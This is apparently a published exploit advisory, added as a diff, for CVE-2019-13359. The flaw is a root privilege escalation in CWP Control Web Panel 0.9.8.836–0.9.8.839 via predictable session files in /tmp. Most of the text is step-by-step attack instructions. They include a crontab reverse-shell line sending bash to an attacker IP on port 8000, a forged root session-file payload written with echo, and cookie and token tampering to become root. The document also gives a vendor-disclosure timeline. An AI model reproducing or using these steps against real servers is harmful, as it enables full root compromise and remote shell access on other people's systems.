@@ -1,0 +1,105 @@
+//====================================================================\\
+||                                                                     ||
+||           CWP Control Web Panel 0.9.8.836 - 0.9.8.839               ||
+||                     Root Privilege Escalation                       ||
+||                                                                     ||
+\\====================================================================//
+
+# ====================================================================
+# Information
+# ====================================================================
+# Exploit Title: CWP (CentOS Control Web Panel) < 0.9.8.40 Root Privilege Escalation
+# Date: 6 July 2019
+# Exploit Author: Pongtorn Angsuchotmetee, Nissana Sirijirakal, Narin Boonwasanarak
+# Vendor Homepage: https://control-webpanel.com/changelog
+# Software Link: http://centos-webpanel.com/cwp-el7-latest (Have to change
+version in the script)
+# Version: 0.9.8.836 to 0.9.8.839
+# Tested on: CentOS 7.6.1810 (Core)
+# CVE : CVE-2019-13359
+
+Product             : CWP Control Web Panel
+Vulnerability Name  : Root Privilege Escalation
+version             : 0.9.8.836
+Fixed on            : 0.9.8.840
+Test on             : Tested on: CentOS 7.6.1810 (Core)
+Reference           : http://centos-webpanel.com/
+                    : https://control-webpanel.com/changelog
+CVE-Number          : CVE-2019-13359
+
+
+# ====================================================================
+# Root course of the vulnerability
+# ====================================================================
+1. The session file are store at /tmp directory
+2. rkey value in the session file dose not change when access by the same source IP address
+
+
+
+# ====================================================================
+# Steps to Reproduce
+# ====================================================================
+
+Session prepareation state
+    1. Check the current IP address of attacker
+    2. Set the IP address on testing environment network
+    3. Login as root on port 2031/2087 and save the cookie name from web browser (cwsrp-xxxxxxxxxxxxxxxxxxxxx)
+    4. Copy the content of session file (/tmp/sess_xxxxxxxxxxxxxx) to a new file "sess_123456"                  # we need "rkey"
+    5. Save the token value from the session file (cwp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx)
+
+    * rkey is created from client ip, then do not change client ip when attack the real target
+
+Attack state
+
+    #
+    #   Method 1 Uploading via reverse shell
+    #
+
+    1. Go to crontab and set "bash -i >& /dev/tcp/[Attacker-IP]/8000 0>&1"
+    2. Create session file through reverse shell
+
+        echo "username|s:4:\"root\";logged|b:1;rkey|s:20:\"[RKEY]\";token|s:36:\"[TOKEN-KEY]\";" > /tmp/sess_123456
+
+    3. On another browser, replace the token value in the URL https://[target.com]:2031/cwp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/admin/index.php
+    4. Change file permission "chmod 664 /tmp/sess_123456"
+    5. Create cookie name "cwsrp-xxxxxxxxxxxxxxxxxxxxx" and set its value to "123456" (sess_123456)
+    6. Open the URL and become the root user
+
+
+    #
+    # Method 2 Uploading via File manager function
+    #
+
+    1. On the real target, login as a normal user on port 2083 and upload file "sess_123456" to /tmp directory and set permission to 644 (chmod 664 /tmp/sess_123456) via crontab feature
+    2. On another browser, replace the token value in the URL https://[target.com]:2031/cwp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/admin/index.php
+    3. Create cookie name "cwsrp-xxxxxxxxxxxxxxxxxxxxx" and set its value to "123456" (sess_123456)
+    4. Open the URL and become the root user
+
+    *From step 1 - 4 need doing it quickly. if we do it too slow, the application will change the permission of file sess_123456 to 600, and the file will become 0 byte. If this happened, attacker need to change session file name and repeat the steps again
+
+
+
+# ====================================================================
+# PoC
+# ====================================================================
+https://github.com/i3umi3iei3ii/CentOS-Control-Web-Panel-CVE/blob/master/CVE-2019-13359.md
+
+
+
+# ====================================================================
+# Timeline
+# ====================================================================
+2019-06-30: Discovered the bug
+2019-06-30: Reported to vendor
+2019-06-30: Vender accepted the vulnerability
+2019-07-02: The vulnerability has been fixed
+2019-07-06: Published
+
+
+
+# ====================================================================
+# Discovered by
+# ====================================================================
+Pongtorn Angsuchotmetee
+Nissana Sirijirakal
+Narin Boonwasanarak
